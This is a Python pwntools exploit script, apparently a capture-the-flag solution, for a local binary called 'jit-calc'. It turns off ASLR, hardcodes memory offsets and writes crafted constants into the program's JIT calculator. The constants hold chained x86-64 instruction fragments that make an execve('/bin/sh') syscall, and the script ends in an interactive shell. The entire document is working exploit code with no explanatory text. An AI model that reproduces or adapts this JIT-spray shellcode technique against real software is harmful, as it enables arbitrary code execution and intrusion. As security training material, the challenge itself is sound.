#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './jit-calc'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def main_menu(idx):
    io.recvuntil('4: Run code')
    io.sendline(str(idx))

def change_idx(idx):
    main_menu(1)
    io.recvuntil("(0-9)")
    io.sendline(str(idx))

def write_menu(idx):
    io.recvuntil("Value")
    io.sendline(str(idx))

def finish_function():
    write_menu(1)

def write_addition(idx):
    write_menu(2)
    io.sendline(str(idx))

def write_constant(c, v):
    write_menu(3)
    io.recvuntil("register 2")
    io.sendline(str(c))
    io.recvuntil("constant:")
    io.sendline(str(v))

def run():
    main_menu(4)

change_idx(0)
main_menu(2)
for i in range(328):
    write_addition(2)
write_constant(1, 0xdde2ff02c28348dd)
main_menu(2)

write_constant(1, 0x02eb32c283489090)
write_constant(1, 0x02ebd78948909090)
write_constant(1, 0x02eb0000003bb890)
write_constant(1, 0x02eb5e5e5a5a9090)
write_constant(1, 0x02eb050f90909090)
write_constant(1, 0x0068732f6e69622f)
for i in range(309):
    write_addition(2)



io.interactive()
